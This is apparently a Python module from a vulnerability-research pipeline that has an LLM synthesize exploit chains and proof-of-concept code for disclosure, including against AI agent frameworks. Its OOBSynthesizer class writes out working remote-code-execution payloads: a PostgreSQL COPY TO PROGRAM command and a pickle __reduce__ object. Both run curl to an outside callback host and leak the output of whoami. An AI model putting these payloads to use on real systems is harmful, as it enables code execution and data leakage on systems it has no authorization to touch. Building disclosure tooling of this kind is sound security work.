"""
layer5/chain_synthesizer.py
Exploit Chain Synthesizer — turns confirmed deviations into weaponized exploit chains.

This is the only layer that uses Opus. It is the final reasoning step before disclosure.

For each high-confidence deviation cluster:
  1. MINIMIZE  — find the smallest reliable input sequence
  2. VERIFY    — confirm reachability from unauthenticated entry point
  3. CHAIN     — combine deviations to amplify blast radius
  4. DOCUMENT  — produce a complete, reproducible PoC

Only deviations with combined_score >= HIGH_CONFIDENCE_THRESHOLD from L4 are used.
Chains are synthesized across deviation clusters — not just per-finding.
"""
from __future__ import annotations

import json
import os
import hashlib
from typing import Optional

from argus.shared.client import ArgusClient


# OOBSynthesizer generates working out-of-band RCE callbacks (pickle,
# PostgreSQL COPY TO PROGRAM). This is real weaponization — gated behind
# ARGUS_ENTERPRISE so the open-source / community edition ships benign
# /tmp marker PoCs only.
OOB_ENABLED = os.environ.get("ARGUS_ENTERPRISE", "").lower() in ("1", "true", "yes")


from argus.shared.models import (
    L4Deviations, L2SurfaceMap, L1Report,
    L5Chains, ExploitChain, ExploitStep,
    DeviationPrediction
)
from argus.shared.prompts import L5_MODEL, L5_CHAIN_SYNTHESIS_PROMPT

# ── Config ────────────────────────────────────────────────────────────────────
HIGH_CONFIDENCE_THRESHOLD = 0.70     # only these pass to synthesis
MAX_CHAINS_TO_SYNTHESIZE  = 20       # cap on chain synthesis calls
MAX_DEVIATIONS_PER_SYNTH  = 12       # deviations fed to each synthesis call
MIN_CHAIN_SCORE           = 0.50     # min combined_score to keep — lowered
                                     # from 0.60 so MEDIUM-composed chains
                                     # survive; L7 sandbox is the final filter

# Blast radius for chains based on component deviation impacts
CHAIN_BLAST_MAP = {
    frozenset(["CRITICAL", "CRITICAL"]): "CRITICAL",
    frozenset(["CRITICAL", "HIGH"]):     "CRITICAL",
    frozenset(["HIGH", "HIGH"]):         "CRITICAL",
    frozenset(["CRITICAL", "MEDIUM"]):   "HIGH",
    frozenset(["HIGH", "MEDIUM"]):       "HIGH",
    frozenset(["MEDIUM", "MEDIUM"]):     "HIGH",
}

# ── Helpers ───────────────────────────────────────────────────────────────────

def _strip_fences(raw: str) -> str:
    raw = raw.strip()
    if raw.startswith("```"):
        lines = raw.split("\n")
        start = 1
        end = len(lines) - 1 if lines[-1].strip() == "```" else len(lines)
        raw = "\n".join(lines[start:end]).strip()
    return raw


def _call_opus(client: ArgusClient, prompt: str,
               max_tokens: int = 6000) -> dict:
    """Opus call — used only for final synthesis.

    Fails closed on truncation / malformed JSON: we return an empty
    ``{"chains": []}`` rather than attempting fragile string surgery on
    partial JSON. Returning empty is strictly better than emitting a
    fabricated chain.
    """
    resp = client.messages.create(
        model=L5_MODEL,
        max_tokens=max_tokens,
        messages=[{"role": "user", "content": prompt}]
    )
    raw = _strip_fences(resp.content[0].text.strip())

    try:
        return json.loads(raw)
    except json.JSONDecodeError:
        # Best-effort recovery: try to locate the last complete chain
        # object and close the outer structure. If that still doesn't
        # parse cleanly, give up honestly.
        truncated = False
        if resp.stop_reason == "max_tokens" or not raw.endswith("}"):
            truncated = True
            last = raw.rfind("},")
            if last == -1:
                last = raw.rfind("}")
            if last > 0:
                candidate = raw[:last + 1].rstrip(", \n\t") + "\n]\n}"
                try:
                    return json.loads(candidate)
                except json.JSONDecodeError:
                    pass
        print(f"    [L5] Opus response unparseable "
              f"(truncated={truncated}, stop_reason={resp.stop_reason}); "
              "returning empty chain list — better than fabricating.")
        return {"chains": []}


def _chain_id(deviation_ids: list[str]) -> str:
    raw = "|".join(sorted(deviation_ids))
    return "CHAIN-" + hashlib.md5(raw.encode()).hexdigest()[:6].upper()


def _blast_from_impacts(impacts: list[str]) -> str:
    """Derive chain blast radius from component deviation impacts."""
    if "CRITICAL" in impacts:
        return "CRITICAL"
    if impacts.count("HIGH") >= 2:
        return "CRITICAL"
    if "HIGH" in impacts:
        return "HIGH"
    return "MEDIUM"


def _entry_point_from_deviations(
    deviations: list[DeviationPrediction],
    surface: L2SurfaceMap
) -> str:
    """Determine chain entry point from component deviations."""
    # Check if any deviation's hypothesis has unauthenticated entry
    hyp_map = {h.hypothesis_id: h for h in surface.ranked_hypotheses}
    for d in deviations:
        hyp = hyp_map.get(d.hypothesis_id)
        if hyp and any("unauth" in ep.lower() or "public" in ep.lower()
                       for ep in hyp.entry_points):
            return "unauthenticated"
    return "low_priv"


# ── Deviation clustering ──────────────────────────────────────────────────────

def _cluster_deviations(
    deviations: list[DeviationPrediction],
    surface: L2SurfaceMap
) -> list[list[DeviationPrediction]]:
    """
    Group deviations into clusters that can form chains.
    Cluster by: same hypothesis, same attack class, or complementary impacts.
    A chain needs at least 2 deviations that causally connect.
    """
    hyp_map = {h.hypothesis_id: h for h in surface.ranked_hypotheses}
    clusters: list[list[DeviationPrediction]] = []

    # Group by attack class
    class_groups: dict[str, list[DeviationPrediction]] = {}
    for d in deviations:
        hyp = hyp_map.get(d.hypothesis_id)
        cls = hyp.attack_class if hyp else "UNKNOWN"
        class_groups.setdefault(cls, []).append(d)

    # Single-class clusters (same attack type working together)
    for cls, devs in class_groups.items():
        if len(devs) >= 2:
            clusters.append(devs[:6])  # cap at 6 per cluster

    # Cross-class clusters (most interesting — complementary attacks)
    # SSRF + DESER = classic chain (SSRF delivers deserialization payload)
    # TRACE_LATERAL + AUTH_BYPASS = escalation chain
    # PHANTOM_MEMORY + MESH_TRUST = memory poisoning → agent trust abuse
    cross_class_pairs = [
        ("SSRF", "DESER"),
        ("TRACE_LATERAL", "AUTH_BYPASS"),
        ("PHANTOM_MEMORY", "MESH_TRUST"),
        ("TRACE_LATERAL", "PHANTOM_MEMORY"),
        ("AUTH_BYPASS", "DESER"),
        ("SSRF", "TRACE_LATERAL"),
        ("MEM_NAMESPACE_LEAK", "MESH_TRUST"),
    ]

    for cls_a, cls_b in cross_class_pairs:
        devs_a = class_groups.get(cls_a, [])
        devs_b = class_groups.get(cls_b, [])
        if devs_a and devs_b:
            combined = devs_a[:3] + devs_b[:3]
            clusters.append(combined)

    # Full cluster — all high-confidence together (for complex multi-hop chains)
    if len(deviations) >= 3:
        clusters.append(deviations[:MAX_DEVIATIONS_PER_SYNTH])

    # Deduplicate clusters by frozenset of IDs
    seen: set = set()
    unique_clusters = []
    for cluster in clusters:
        key = frozenset(d.payload_id for d in cluster)
        if key not in seen:
            seen.add(key)
            unique_clusters.append(cluster)

    return unique_clusters[:MAX_CHAINS_TO_SYNTHESIZE]


# ── Chain synthesis ───────────────────────────────────────────────────────────

import uuid

class OOBSynthesizer:
    """Layer 5 Upgrade: Generates payloads that trigger external callbacks."""
    def __init__(self, callback_url: str = "http://argus-callback.io"):
        self.callback_url = callback_url

    def synthesize_rce(self, sink_type: str, original_poc: str) -> str:
        """Generates the 'Wilson-Proof' OOB payload."""
        unique_id = uuid.uuid4().hex
        
        # We replace naive touch markers with the industry standard OOB callback.
        oob_payload = f"curl {self.callback_url}/{unique_id}"
        if sink_type == "cursor.execute" or "sql" in sink_type.lower():
            # Target: PostgreSQL RCE
            oob = f"COPY (SELECT 'pwned') TO PROGRAM '{oob_payload}/$(whoami)';"
            return original_poc.replace("SELECT 'pwned'", oob).replace("touch /tmp/", oob)
            
        if sink_type == "pickle.load" or "pickle" in sink_type.lower():
            # Target: CrewAI Checkpoint RCE
            return self._generate_pickle_callback(unique_id)
            
        return original_poc.replace("touch /tmp/", oob_payload)

    def _generate_pickle_callback(self, unique_id: str) -> str:
        return f"""import os, pickle
class PoC:
    def __reduce__(self):
        return (os.system, ('curl {self.callback_url}/{unique_id}/$(whoami)',))
payload = pickle.dumps(PoC())
"""

def _synthesize_cluster(
    client: ArgusClient,
    cluster: list[DeviationPrediction],
    surface: L2SurfaceMap,
    l1_report: Optional[L1Report],
    target: str,
    verbose: bool
) -> list[ExploitChain]:
    """
    Synthesize exploit chains from a deviation cluster using Opus.
    This is the single most expensive call in the pipeline — Opus only.
    """
    hyp_map = {h.hypothesis_id: h for h in surface.ranked_hypotheses}

    # Build rich deviation summary for Opus
    deviation_summary = []
    for d in cluster:
        hyp = hyp_map.get(d.hypothesis_id)
        deviation_summary.append(
            f"[{d.payload_id}] {d.deviation_type} | impact:{d.impact} | "
            f"score:{d.combined_score:.2f}\n"
            f"  class: {hyp.attack_class if hyp else 'UNKNOWN'}\n"
            f"  deviation: {d.predicted_deviation[:200]}\n"
            f"  triggers: {'; '.join(d.trigger_conditions[:2])}\n"
            f"  fidelity: {d.fidelity_score:.2f} ({d.fidelity_notes})"
        )

    # Add L1 finding context for richest possible synthesis
    l1_context = ""
    if l1_report:
        all_findings = l1_report.production_findings + l1_report.example_findings
        relevant_ids = set()
        for d in cluster:
            hyp = hyp_map.get(d.hypothesis_id)
            if hyp:
                relevant_ids.update(hyp.finding_ids)
        relevant_findings = [f for f in all_findings if f.id in relevant_ids][:5]
        if relevant_findings:
            l1_context = "\n\nRELEVANT L1 FINDINGS:\n" + "\n".join(
                f"  [{f.id}] {f.vuln_class} | {f.title}\n"
                f"    file: {f.file}\n"
                f"    {f.description[:150]}"
                for f in relevant_findings
            )

    try:
        # Tell Opus the exact installed-package names so it writes
        # `from crewai...` not `from crewai.src.crewai...`. Falls back
        # to an empty list when we can't resolve (standalone scans).
        try:
            from argus.layer7.sandbox import target_packages as _tp
            tpkgs = _tp(target) or []
        except Exception:
            tpkgs = []
        tpkg_line = ", ".join(tpkgs) if tpkgs else "(none resolved — derive from file paths)"

        prompt = L5_CHAIN_SYNTHESIS_PROMPT.format(
            deviations="\n\n".join(deviation_summary) + l1_context,
            target=target,
            target_packages=tpkg_line,
        )

        data = _call_opus(client, prompt)
        chains_data = data.get("chains", [])
        
        oob_synth = OOBSynthesizer()

        chains = []
        for c in chains_data:
            # Validate minimum quality
            combined_score = float(c.get("combined_score", 0.0))
            if combined_score < MIN_CHAIN_SCORE:
                continue

            steps = [
                ExploitStep(
                    step=s["step"],
                    action=s.get("action", ""),
                    payload=s.get("payload"),
                    achieves=s.get("achieves", "")
                )
                for s in c.get("steps", [])
            ]

            component_ids = c.get("component_deviations", [d.payload_id for d in cluster])
            blast = _blast_from_impacts([d.impact for d in cluster])
            
            # --- OOB Synthesizer Injection (Enterprise only) ---
            # Without ARGUS_ENTERPRISE=1 the PoC stays with its benign
            # /tmp/argus_poc_<slug> marker. Enterprise mode swaps in a
            # real out-of-band callback (curl to argus-callback.io).
            raw_poc = c.get("poc_code", "")
            sink_hints = " ".join([d.deviation_type for d in cluster]).lower() + raw_poc.lower()
            if (OOB_ENABLED and raw_poc and
                    ("rce" in sink_hints or "pickle" in sink_hints
                     or "exec" in sink_hints or "sql" in sink_hints)):
                poc_code = oob_synth.synthesize_rce(sink_hints, raw_poc)
            else:
                poc_code = raw_poc

            chains.append(ExploitChain(
                chain_id=_chain_id(component_ids),
                title=c.get("title", "Unnamed Chain"),
                component_deviations=component_ids,
                steps=steps,
                poc_code=poc_code,
                cvss_estimate=c.get("cvss_estimate"),
                mitre_atlas_ttps=c.get("mitre_atlas_ttps", []),
                owasp_llm_categories=c.get("owasp_llm_categories", []),
                preconditions=c.get("preconditions", []),
                blast_radius=c.get("blast_radius", blast),
                entry_point=c.get("entry_point",
                                  _entry_point_from_deviations(cluster, surface)),
                combined_score=combined_score
            ))

        return chains

    except Exception as e:
        if verbose:
            print(f"    [L5] Synthesis error: {e}")
        return []


# ── Main ──────────────────────────────────────────────────────────────────────

def run_layer5(
    l4_deviations: L4Deviations,
    surface: L2SurfaceMap,
    l1_report: Optional[L1Report] = None,
    verbose: bool = False
) -> L5Chains:
    """
    Synthesize exploit chains from L4 high-confidence deviations.
    Uses Opus exclusively — this is the single most expensive layer.
    Only called with deviations that passed the L4 fidelity filter.
    """
    client = ArgusClient()
    results = L5Chains(target=l4_deviations.target)

    # Filter to high-confidence only
    high_conf = [
        d for d in l4_deviations.deviations
        if d.combined_score >= HIGH_CONFIDENCE_THRESHOLD
    ]

    print(f"\n[L5] Exploit Chain Synthesizer")
    print(f"     Model: {L5_MODEL} (Opus — final synthesis)")
    print(f"     High-confidence deviations: {len(high_conf)}")

    if not high_conf:
        print(f"     ⚠  No high-confidence deviations — check L4 output")
        print(f"        Run with --verbose to see fidelity penalties")
        return results

    # Sort by combined_score descending
    high_conf.sort(key=lambda d: d.combined_score, reverse=True)

    # Build deviation clusters
    clusters = _cluster_deviations(high_conf, surface)
    print(f"     Deviation clusters: {len(clusters)}")
    print(f"     Opus calls planned: {len(clusters)}")

    all_chains: list[ExploitChain] = []
    seen_chain_ids: set[str] = set()

    for i, cluster in enumerate(clusters):
        attack_classes = list(set(
            (next((h for h in surface.ranked_hypotheses
                   if h.hypothesis_id == d.hypothesis_id), None) or
             type('', (), {'attack_class': 'UNKNOWN'})()).attack_class
            for d in cluster
        ))

        print(f"\n  [{i+1:>2}/{len(clusters)}] Synthesizing cluster: "
              f"{'+'.join(attack_classes)} ({len(cluster)} deviations)")
        print(f"         Top scores: "
              f"{', '.join(f'{d.combined_score:.2f}' for d in cluster[:3])}")

        chains = _synthesize_cluster(
            client, cluster, surface, l1_report,
            l4_deviations.target, verbose
        )

        # Deduplicate
        for chain in chains:
            if chain.chain_id not in seen_chain_ids:
                seen_chain_ids.add(chain.chain_id)
                all_chains.append(chain)

        for chain in chains:
            if chain.chain_id in seen_chain_ids:
                br_icon = {"CRITICAL": "🔴", "HIGH": "🟠", "MEDIUM": "🟡"}.get(
                    chain.blast_radius, "⚪"
                )
                print(f"  {br_icon} [{chain.blast_radius}] {chain.chain_id}: "
                      f"{chain.title}")
                print(f"     Steps: {len(chain.steps)} | "
                      f"Entry: {chain.entry_point} | "
                      f"Score: {chain.combined_score:.2f}")
                if chain.cvss_estimate:
                    print(f"     CVSS: {chain.cvss_estimate[:50]}")

    # Sort final chains by blast_radius then combined_score
    br_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3}
    all_chains.sort(
        key=lambda c: (br_order.get(c.blast_radius, 3), -c.combined_score)
    )

    results.chains        = all_chains
    results.critical_count = sum(1 for c in all_chains if c.blast_radius == "CRITICAL")
    results.high_count    = sum(1 for c in all_chains if c.blast_radius == "HIGH")

    print(f"\n[L5] Complete — {len(all_chains)} exploit chains synthesized")
    print(f"     🔴 CRITICAL: {results.critical_count}")
    print(f"     🟠 HIGH    : {results.high_count}")

    if all_chains:
        print(f"\n  Top chains:")
        for chain in all_chains[:5]:
            poc_status = "✓ PoC" if chain.poc_code else "○ no PoC"
            print(f"    [{chain.blast_radius}] {chain.chain_id}: "
                  f"{chain.title[:55]} [{poc_status}]")

    return results
